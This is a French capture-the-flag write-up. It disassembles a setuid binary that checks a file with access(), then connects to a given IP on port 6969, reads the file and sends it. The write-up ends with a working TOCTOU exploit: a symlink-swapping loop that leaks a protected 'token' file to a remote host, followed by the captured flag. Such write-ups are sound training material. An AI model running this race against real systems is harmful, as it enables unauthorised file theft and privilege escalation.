On voit que la fonction `access` est utilisé dans la fonction `main`,
elle vérifie si l'utilisateur réel a le droit d'accès au fichier en lecture.

```bash
> disassemble main
...
0x0804871f <+75>:	mov    eax,DWORD PTR [esp+0x1c]
0x08048723 <+79>:	mov    eax,DWORD PTR [eax+0x4]
0x08048726 <+82>:	mov    DWORD PTR [esp+0x28],eax  // argv[1]
0x0804872a <+86>:	mov    eax,DWORD PTR [esp+0x1c]
0x0804872e <+90>:	mov    eax,DWORD PTR [eax+0x8]
0x08048731 <+93>:	mov    DWORD PTR [esp+0x2c],eax  // argv[2]
0x08048735 <+97>:	mov    eax,DWORD PTR [esp+0x1c]
0x08048739 <+101>:	add    eax,0x4
0x0804873c <+104>:	mov    eax,DWORD PTR [eax]
0x0804873e <+106>:	mov    DWORD PTR [esp+0x4],0x4
0x08048746 <+114>:	mov    DWORD PTR [esp],eax
0x08048749 <+117>:	call   0x80485e0 <access@plt>
0x0804874e <+122>:	test   eax,eax
0x08048750 <+124>:	jne    0x8048940 <main+620>
...
0x08048940 <+620>:	mov    eax,0x8048b3f
0x08048945 <+625>:	mov    edx,DWORD PTR [esp+0x28]
0x08048949 <+629>:	mov    DWORD PTR [esp+0x4],edx
0x0804894d <+633>:	mov    DWORD PTR [esp],eax
0x08048950 <+636>:	call   0x8048520 <printf@plt>
0x08048955 <+641>:	mov    edx,DWORD PTR [esp+0x104c]
0x0804895c <+648>:	xor    edx,DWORD PTR gs:0x14
0x08048963 <+655>:	je     0x804896a <main+662>
0x08048965 <+657>:	call   0x8048540 <__stack_chk_fail@plt>
0x0804896a <+662>:	leave  
0x0804896b <+663>:	ret

> x/s 0x8048b3f
0x8048b3f:	 "You don't have access to %s\n"
```

Une connection est établie avec l'hôte passé en deuxième argument.

```bash
> disassemble main
...
0x08048778 <+164>:	mov    DWORD PTR [esp+0x8],0x0
0x08048780 <+172>:	mov    DWORD PTR [esp+0x4],0x1
0x08048788 <+180>:	mov    DWORD PTR [esp],0x2
0x0804878f <+187>:	call   0x80485f0 <socket@plt>
0x08048794 <+192>:	mov    DWORD PTR [esp+0x30],eax  // fd
0x08048798 <+196>:	lea    eax,[esp+0x103c]
0x0804879f <+203>:	mov    DWORD PTR [eax],0x0
0x080487a5 <+209>:	mov    DWORD PTR [eax+0x4],0x0
0x080487ac <+216>:	mov    DWORD PTR [eax+0x8],0x0
0x080487b3 <+223>:	mov    DWORD PTR [eax+0xc],0x0
0x080487ba <+230>:	mov    WORD PTR [esp+0x103c],0x2
0x080487c4 <+240>:	mov    eax,DWORD PTR [esp+0x2c]  // argv[2]
0x080487c8 <+244>:	mov    DWORD PTR [esp],eax
0x080487cb <+247>:	call   0x8048600 <inet_addr@plt>
0x080487d0 <+252>:	mov    DWORD PTR [esp+0x1040],eax
0x080487d7 <+259>:	mov    DWORD PTR [esp],0x1b39     // Port 6969
0x080487de <+266>:	call   0x8048550 <htons@plt>
0x080487e3 <+271>:	mov    WORD PTR [esp+0x103e],ax
0x080487eb <+279>:	mov    DWORD PTR [esp+0x8],0x10
0x080487f3 <+287>:	lea    eax,[esp+0x103c]
0x080487fa <+294>:	mov    DWORD PTR [esp+0x4],eax
0x080487fe <+298>:	mov    eax,DWORD PTR [esp+0x30]
0x08048802 <+302>:	mov    DWORD PTR [esp],eax
0x08048805 <+305>:	call   0x8048610 <connect@plt>
...
```   

Ensuite le fichier, passé en premier argument, est ensuite ouvert avec la fonction `open`

```bash
> disassemble main
...
0x08048894 <+448>:	mov    eax,DWORD PTR [esp+0x28]  // argv[1]
0x08048898 <+452>:	mov    DWORD PTR [esp],eax
0x0804889b <+455>:	call   0x80485a0 <open@plt>
0x080488a0 <+460>:	mov    DWORD PTR [esp+0x34],eax
...
```

Le contenu du fichier est ensuite lu avec la fonction `read`

```bash
> disassemble main
...
0x080488c3 <+495>:	mov    DWORD PTR [esp+0x8],0x1000  // size
0x080488cb <+503>:	lea    eax,[esp+0x3c]
0x080488cf <+507>:	mov    DWORD PTR [esp+0x4],eax     // buf
0x080488d3 <+511>:	mov    eax,DWORD PTR [esp+0x34]
0x080488d7 <+515>:	mov    DWORD PTR [esp],eax         // fd
0x080488da <+518>:	call   0x8048510 <read@plt>
0x080488df <+523>:	mov    DWORD PTR [esp+0x38],eax
...
```

Le contenu du fichier est ensuite envoyé au socket avec la fonction `write`

```bash
> disassemble main
...
0x08048916 <+578>:	mov    eax,DWORD PTR [esp+0x38]
0x0804891a <+582>:	mov    DWORD PTR [esp+0x8],eax  // size
0x0804891e <+586>:	lea    eax,[esp+0x3c]
0x08048922 <+590>:	mov    DWORD PTR [esp+0x4],eax  // buf
0x08048926 <+594>:	mov    eax,DWORD PTR [esp+0x30]
0x0804892a <+598>:	mov    DWORD PTR [esp],eax      // fd
0x0804892d <+601>:	call   0x80485c0 <write@plt>
...
```

La vulnérabilité se situe au niveau de la fonction `access` car entre l'appel de la fonction `access`
et la fonction `open` on peut changer le contenu du fichier.

Pour faire cela on peut utiliser un lien symbolique qui pointera vers un fichier que l'utilisateur `level10` possède
comme ça la fonction `access` retourne une valeur positive, ensuite on modifie le lien symbolique pour qu'il pointe vers le fichier `token`
et la fonction `open` va l'ouvrir sans problème.

```bash
while true; do ln -fs ~/level10 /tmp/exploit; ln -fs ~/token /tmp/exploit; done
```
```bash
./level10 /tmp/exploit 10.12.3.12
```

```bash
woupa2yuojeeaaed06riuj63c
```
